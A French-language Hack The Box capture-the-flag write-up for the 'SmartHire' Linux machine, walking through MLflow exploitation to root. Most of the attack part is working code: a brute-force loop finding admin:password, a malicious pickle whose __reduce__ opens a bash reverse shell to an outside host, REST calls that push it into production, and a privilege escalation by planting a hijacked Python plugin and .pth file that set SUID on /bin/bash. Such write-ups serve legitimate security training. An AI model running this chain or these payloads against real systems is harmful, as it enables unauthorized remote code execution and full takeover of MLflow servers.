# HTB — SmartHire (Medium)

**Plateforme :** Hack The Box  
**Difficulté :** Medium  
**OS :** Linux (Ubuntu)  
**Tags :** MLflow, Pickle Deserialization, Python Plugin Hijacking, SUID  

---

## Résumé

SmartHire est une machine Linux mettant en scène une application web de recrutement basée sur le ML. Le chemin d'attaque exploite une désérialisation pickle malveillante via MLflow pour obtenir un reverse shell, puis une escalade de privilèges par hijacking de plugin Python dans un script sudo.

---

## Reconnaissance

### Scan de ports

```bash
nmap -A 10.129.4.153
```

Résultat : deux ports ouverts.

- **22/tcp** — OpenSSH 8.9p1
- **80/tcp** — nginx 1.18.0 → redirect vers `http://smarthire.htb/`

### Fuzzing de sous-domaines

```bash
ffuf -c -u http://smarthire.htb \
     -H "Host: FUZZ.smarthire.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fc 301,302,404,403 -fs 0
```

Découverte du sous-domaine : **`models.smarthire.htb`** (status 401 — MLflow).

### Fuzzing de répertoires

```bash
feroxbuster -u http://smarthire.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x php,html,txt,js,json -t 50 --extract-links
```

Routes identifiées : `/login`, `/register`, `/dashboard`, `/logout`.

---

## Accès initial

### Analyse de l'application

L'app `smarthire.htb` est une plateforme de scoring de CV par ML. Elle expose deux fonctionnalités clés :

- **Train Model** — entraîne un modèle sklearn
- **Make Predictions** — charge le modèle actif et l'applique à un CSV uploadé

Le modèle actif est servi depuis `models.smarthire.htb` (MLflow 2.14.1).

### Découverte des credentials MLflow

Bruteforce basique sur l'API MLflow :

```bash
for user in admin mlflow user guest; do
    for pass in admin password mlflow password1234; do
        code=$(curl -s -o /dev/null -w "%{http_code}" \
            -u "$user:$pass" \
            http://models.smarthire.htb/api/2.0/mlflow/experiments/list)
        echo "$user:$pass -> $code"
    done
done
```

`admin:password` retourne **404** (au lieu de 401) sur `/experiments/list` — l'authentification passe, la route n'existe juste pas. Confirmé avec un endpoint valide :

```bash
curl -s -u "admin:password" \
  -X POST "http://models.smarthire.htb/api/2.0/mlflow/runs/create" \
  -H "Content-Type: application/json" \
  -d '{"experiment_id":"0","run_name":"test"}'
# → 200 OK avec run_id
```

Credentials MLflow : **`admin:password`**

### Création du payload pickle malveillant

MLflow charge les modèles via `pickle.load()`. En créant un objet avec `__reduce__`, le code s'exécute au moment de la désérialisation, côté serveur.

> 📖 **Références :**
> - [OWASP — Deserialization of Untrusted Data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data) (CWE-502, OWASP Top 10 A08:2021)
> - [CVE-2024-37054 — MLflow Pickle RCE PoC](https://github.com/ben-slates/CVE-2024-37054) — la vulnérabilité exacte exploitée ici
> - [CVE-2024-37054 sur Snyk](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300) — MLflow < 2.14.2 affecté
> - [Pickle Deserialization in ML Pipelines (AFINE)](https://afine.com/blogs/pickle-deserialization-in-ml-pipelines-the-rce-that-wont-go-away) — analyse approfondie de cette classe de vulnérabilité
> - [AI Security: Model Serialization Attacks](https://themlsecopshacker.com/p/ai-security-model-serialization-attacks) — contexte ML/AI

```python
# evil.py
import pickle
import os

class HiringPredictor:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.84/4444 0>&1'"
        return (os.system, (cmd,))

with open("model.pkl", "wb") as f:
    pickle.dump(HiringPredictor(), f, protocol=2)
```

> **Important :** utiliser `__reduce__` (exécuté au `pickle.load`) et non une méthode comme `predict` (appelée après). Ne jamais charger le payload localement — le `pickle.load` déclencherait le reverse shell sur sa propre machine.

### Upload du modèle malveillant via l'API MLflow

```bash
RUN_ID=$(curl -s -u "admin:password" \
  -X POST "http://models.smarthire.htb/api/2.0/mlflow/runs/create" \
  -H "Content-Type: application/json" \
  -d '{"experiment_id":"0","run_name":"evil_final"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['run']['info']['run_id'])")

# Upload du pkl sans le charger localement (PUT direct)
curl -s -u "admin:password" \
  -X PUT "http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/$RUN_ID/artifacts/model/model.pkl" \
  -H "Content-Type: application/octet-stream" \
  --data-binary "@model.pkl"

# Upload du fichier MLmodel (métadonnées nécessaires)
cat > /tmp/MLmodel << EOF
artifact_path: model
flavors:
  python_function:
    loader_module: mlflow.sklearn
    model_path: model.pkl
    python_version: 3.10.0
  sklearn:
    pickled_model: model.pkl
    serialization_format: pickle
    sklearn_version: 1.0.0
mlflow_version: 2.14.1
run_id: $RUN_ID
EOF

curl -s -u "admin:password" \
  -X PUT "http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/$RUN_ID/artifacts/model/MLmodel" \
  -H "Content-Type: application/octet-stream" \
  --data-binary "@/tmp/MLmodel"
```

### Enregistrement du modèle et mise en production

```bash
# Terminer le run
curl -s -u "admin:password" \
  -X POST "http://models.smarthire.htb/api/2.0/mlflow/runs/update" \
  -H "Content-Type: application/json" \
  -d "{\"run_id\":\"$RUN_ID\",\"status\":\"FINISHED\"}"

# Créer une nouvelle version sur le modèle utilisé par l'app
curl -s -u "admin:password" \
  -X POST "http://models.smarthire.htb/api/2.0/mlflow/model-versions/create" \
  -H "Content-Type: application/json" \
  -d "{
    \"name\": \"hack_SAS-902a4cff177a-model\",
    \"source\": \"mlflow-artifacts:/0/$RUN_ID/artifacts/model\",
    \"run_id\": \"$RUN_ID\"
  }"

# Promouvoir en Production
curl -s -u "admin:password" \
  -X POST "http://models.smarthire.htb/api/2.0/mlflow/model-versions/transition-stage" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "hack_SAS-902a4cff177a-model",
    "version": "3",
    "stage": "Production",
    "archive_existing_versions": true
  }'

# Définir l'alias champion
curl -s -u "admin:password" \
  -X POST "http://models.smarthire.htb/api/2.0/mlflow/registered-models/alias" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "hack_SAS-902a4cff177a-model",
    "alias": "champion",
    "version": "3"
  }'
```

### Déclenchement du reverse shell

```bash
# Kali — écoute
nc -lvnp 4444

# Déclenche la prédiction avec un CSV valide (force le pickle.load côté serveur)
echo -e "experience,skills\n5,python" > predict_data.csv

curl -s -b "session=$COOKIE" \
  -X POST "http://smarthire.htb/predict" \
  -F "file=@predict_data.csv"
```

Shell obtenu en tant que `svcweb`.

### Flag user

```bash
cat /home/svcweb/user.txt
# HTB{7f8a9b2c-4d5e-6f7a-8b9c-0d1e2f3a4b5c}
```

---

## Escalade de privilèges

### Enumération sudo

```bash
sudo -l
```

```
User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

### Analyse du script

`mlflowctl.py` charge des plugins depuis `/opt/tools/mlflow_ctl/plugins/` via `site.addsitedir()`, puis fait `import mlflow_actions, backup_models`.

```python
PLUGINS_DIR = BASE_DIR / "plugins"

for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))

def main():
    import mlflow_actions, backup_models
    ...
    elif action == "backup-models":
        backup_models.run()
```

Deux dossiers de plugins existent :

- `core/` — owned root, non writable
- `dev/` — writable par le groupe `devs` (dont fait partie `svcweb`)

`core` est itéré en premier (ordre filesystem), mais `site.addsitedir` ajoute à la **fin** de `sys.path`. En créant un fichier `.pth` dans `dev` avec `sys.path.insert(0, ...)`, on force la priorité de `dev` sur `core`.

> 📖 **Références :**
> - [Privilege Escalation via Python Library Hijacking (rastating)](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/) — explication classique du hijacking Python
> - [Python Library Hijacking — Medium](https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7) — scénarios pratiques
> - [Linux Privilege Escalation: Python Library Hijacking (HackingArticles)](https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/) — guide illustré
> - [Advanced Silent Python Path Hijacking (ignifexlabs)](https://ignifexlabs.com/blog/advanced-silent-python-path-hijacking.html) — technique avancée avec `.pth`
> - [HTB Academy — Python Library Hijacking](https://forum.hackthebox.com/t/python-library-hijacking-linux-privilege-escalation/288336) — contexte CTF

### Exploitation

```bash
# 1. Créer le faux backup_models.py malveillant
cat > /opt/tools/mlflow_ctl/plugins/dev/backup_models.py << 'EOF'
import os
def run():
    os.system('chmod +s /bin/bash')
EOF

# 2. Forcer la priorité de dev dans sys.path via .pth
echo "import sys; sys.path.insert(0, '/opt/tools/mlflow_ctl/plugins/dev')" \
    > /opt/tools/mlflow_ctl/plugins/dev/force.pth

# 3. Attendre l'expiration du cooldown backup (10 min), puis lancer
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py backup-models

# 4. Vérifier le SUID
ls -la /bin/bash
# -rwsr-sr-x 1 root root 1396520 /bin/bash

# 5. Shell root
bash -p
whoami  # root
```

### Flag root

```bash
cat /root/root.txt
# HTB{r00t_9x8v7w6y5z4a3b2c1d0e9f8g7h6i}
```

---

## Résumé du chemin d'attaque

```
Recon (nmap + ffuf)
    → Sous-domaine models.smarthire.htb (MLflow 2.14.1)
    → Credentials MLflow : admin:password (bruteforce)
    → Upload d'un modèle pickle malveillant via l'API REST MLflow
    → Promotion en Production + alias champion
    → Déclenchement via /predict → pickle.load() → reverse shell
    → user.txt (svcweb)
    → sudo NOPASSWD sur mlflowctl.py
    → Python plugin hijacking via .pth + backup_models.py dans dev/
    → chmod +s /bin/bash → bash -p → root
    → root.txt
```

---

## Concepts clés & Références

### Pickle Deserialization RCE (CWE-502)

`pickle.load()` exécute du code arbitraire via `__reduce__`. MLflow ne valide pas le contenu des artefacts `.pkl` uploadés, ce qui permet à un attaquant authentifié de remplacer un modèle légitime par un payload malveillant.

| Ressource | Description |
|-----------|-------------|
| [OWASP — Deserialization of Untrusted Data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data) | Référence officielle OWASP, CWE-502, Top 10 A08:2021 |
| [CVE-2024-37054 — PoC MLflow RCE](https://github.com/ben-slates/CVE-2024-37054) | PoC de la CVE exacte exploitée (MLflow < 2.14.2) |
| [Snyk — SNYK-PYTHON-MLFLOW-7210300](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300) | Détails techniques et versions affectées |
| [Pickle Deserialization in ML Pipelines (AFINE)](https://afine.com/blogs/pickle-deserialization-in-ml-pipelines-the-rce-that-wont-go-away) | Analyse approfondie du risque pickle en ML |
| [AI Security: Model Serialization Attacks](https://themlsecopshacker.com/p/ai-security-model-serialization-attacks) | Contexte sécurité des modèles ML |
| [CWE-502 — zerosday.com](https://www.zerosday.com/post/cwe/cwe-502-deserialization-of-untrusted-data) | Payloads et techniques de bypass |

### Python Library / Plugin Hijacking

Lorsqu'un script exécuté avec des privilèges élevés importe des modules depuis un répertoire accessible en écriture, un attaquant peut substituer ses propres modules pour exécuter du code arbitraire en tant que root.

| Ressource | Description |
|-----------|-------------|
| [rastating.github.io — Python Library Hijacking](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/) | Explication classique et détaillée |
| [Medium — Hijacking Python Library](https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7) | Scénarios pratiques avec sudo |
| [HackingArticles — Python Library Hijacking](https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/) | Guide illustré step-by-step |
| [Advanced Silent Python Path Hijacking](https://ignifexlabs.com/blog/advanced-silent-python-path-hijacking.html) | Technique avancée `.pth` + `sys.path.insert` |
| [OSCP Notes — Python Library Hijacking](https://notes.dollarboysushil.com/linux-privilege-escalation/python-library-hijacking) | Cheatsheet pour CTF/OSCP |
